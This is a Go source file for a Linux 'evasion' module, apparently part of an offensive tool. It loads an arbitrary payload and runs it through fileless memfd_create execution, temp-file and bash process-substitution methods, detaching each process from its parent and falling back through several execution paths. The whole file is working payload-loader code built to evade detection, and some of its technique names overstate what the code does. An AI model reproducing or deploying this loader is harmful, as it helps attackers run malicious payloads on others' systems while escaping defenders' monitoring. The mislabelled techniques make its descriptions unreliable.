//go:build linux

package evasion

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
)

func init() {
	// Change this function when Linux starts
	newLinuxEvasion = func(options Options) (Evasion, error) {
		return &LinuxEvasion{
			options: options,
		}, nil
	}
}

// LinuxEvasion, applies evasion techniques for Linux
type LinuxEvasion struct {
	options Options
}

// ExecutePayload, executes the payload using evasion techniques
func (e *LinuxEvasion) ExecutePayload(filePath string) error {
	fmt.Println("[+] Linux evasion techniques are being used...")

	// Read the file
	payload, err := ReadPayload(filePath)
	if err != nil {
		return fmt.Errorf("payload reading error: %v", err)
	}

	// Try all methods
	methods := []struct {
		name   string
		method func([]byte) error
	}{
		{"MemFD Execution", e.memfdExecution},
		{"Shared Memory Execution", e.sharedMemoryExecution},
		{"Process Substitution", e.processSubstitution},
	}

	// Try each method
	for _, m := range methods {
		fmt.Printf("[*] %s technique is being tested...\n", m.name)
		err := m.method(payload)
		if err == nil {
			fmt.Printf("[+] %s technique applied successfully!\n", m.name)
			return nil
		}
		fmt.Printf("[!] %s technique failed: %v\n", m.name, err)
	}

	// If no advanced techniques worked, use the reliable backup method
	fmt.Println("[*] All advanced techniques failed, using reliable backup method...")
	return e.reliableExecution(filePath, payload)
}

// LEM1: Linux MemFD Execution technique
func (e *LinuxEvasion) memfdExecution(payload []byte) error {
	fmt.Println("[*] Linux MemFD Execution is being applied...")

	// 1. create memory file descriptor using memfd_create syscall
	fd, _, err := syscall.Syscall(
		319, // memfd_create syscall number
		uintptr(unsafe.Pointer(&[]byte("memfd\x00")[0])),
		0,
		0,
	)
	if err != 0 && err != syscall.Errno(0) {
		return fmt.Errorf("memfd_create error: %v", err)
	}

	// 2. write payload to memory file
	_, writeErr := syscall.Write(int(fd), payload)
	if writeErr != nil {
		syscall.Close(int(fd))
		return fmt.Errorf("memory write error: %v", writeErr)
	}

	// 3. execute the memory file using fexecve
	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	// make the file executable
	if err := syscall.Fchmod(int(fd), 0755); err != nil {
		syscall.Close(int(fd))
		return fmt.Errorf("chmod error: %v", err)
	}

	// use fork+exec instead of execve
	cmd := exec.Command(fdPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true, // create a new process group
	}

	if err := cmd.Start(); err != nil {
		syscall.Close(int(fd))
		return fmt.Errorf("execution error: %v", err)
	}

	// close the file descriptor (the running process can still use it)
	syscall.Close(int(fd))

	fmt.Printf("[+] Process started (PID: %d)\n", cmd.Process.Pid)

	// release the process from the parent process
	cmd.Process.Release()

	return nil
}

// LEM2: Shared Memory Execution technique
func (e *LinuxEvasion) sharedMemoryExecution(payload []byte) error {
	fmt.Println("[*] Shared Memory Execution is being applied...")

	// 1. create a temporary file
	tempFile, err := os.CreateTemp("", "shm_exec_*")
	if err != nil {
		return fmt.Errorf("temporary file creation error: %v", err)
	}
	tempPath := tempFile.Name()
	defer os.Remove(tempPath) // cleanup

	// 2. write payload to temporary file
	if _, err := tempFile.Write(payload); err != nil {
		tempFile.Close()
		return fmt.Errorf("file write error: %v", err)
	}
	tempFile.Close()

	// 3. make the file executable
	if err := os.Chmod(tempPath, 0755); err != nil {
		return fmt.Errorf("chmod error: %v", err)
	}

	// 4. execute the file
	cmd := exec.Command(tempPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true, // create a new process group
	}

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("execution error: %v", err)
	}

	fmt.Printf("[+] Process started (PID: %d)\n", cmd.Process.Pid)

	// release the process from the parent process
	cmd.Process.Release()

	return nil
}

// LEM3: Process Substitution technique
func (e *LinuxEvasion) processSubstitution(payload []byte) error {
	fmt.Println("[*] Process Substitution is being applied...")

	// 1. create a temporary file
	tempFile, err := os.CreateTemp("", "proc_subst_*")
	if err != nil {
		return fmt.Errorf("temporary file creation error: %v", err)
	}
	tempPath := tempFile.Name()
	defer os.Remove(tempPath) // cleanup

	// 2. write payload to temporary file
	if _, err := tempFile.Write(payload); err != nil {
		tempFile.Close()
		return fmt.Errorf("file write error: %v", err)
	}
	tempFile.Close()

	// 3. make the file executable
	if err := os.Chmod(tempPath, 0755); err != nil {
		return fmt.Errorf("chmod error: %v", err)
	}

	// 4. execute the file using bash process substitution
	cmd := exec.Command("bash", "-c", fmt.Sprintf("source <(%s)", tempPath))
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true, // create a new process group
	}

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("execution error: %v", err)
	}

	fmt.Printf("[+] Process started (PID: %d)\n", cmd.Process.Pid)

	// release the process from the parent process
	cmd.Process.Release()

	return nil
}

// Reliable backup method - try multiple techniques
func (e *LinuxEvasion) reliableExecution(filePath string, payload []byte) error {
	// 1. method: use exec.Command directly
	cmd := exec.Command(filePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true, // create a new process group
	}

	err := cmd.Start()
	if err == nil {
		fmt.Printf("[+] File executed successfully (exec.Command): %s\n", filePath)
		cmd.Process.Release()
		return nil
	}
	fmt.Printf("[!] exec.Command failed: %v\n", err)

	// 2. method: bash -c
	cmd = exec.Command("bash", "-c", filePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true,
	}

	err = cmd.Start()
	if err == nil {
		fmt.Printf("[+] File executed successfully (bash -c): %s\n", filePath)
		cmd.Process.Release()
		return nil
	}
	fmt.Printf("[!] bash -c failed: %v\n", err)

	// 3. method: create a temporary file and execute it
	tempFile, err := os.CreateTemp("", "exec_*")
	if err == nil {
		tempPath := tempFile.Name()
		defer os.Remove(tempPath)

		if _, err := tempFile.Write(payload); err == nil {
			tempFile.Close()

			if err := os.Chmod(tempPath, 0755); err == nil {
				cmd = exec.Command(tempPath)
				cmd.SysProcAttr = &syscall.SysProcAttr{
					Setpgid: true,
				}

				if err := cmd.Start(); err == nil {
					fmt.Printf("[+] File executed successfully (temporary file): %s\n", tempPath)
					cmd.Process.Release()
					return nil
				}
			}
		}
	}

	return fmt.Errorf("all execution methods failed")
}
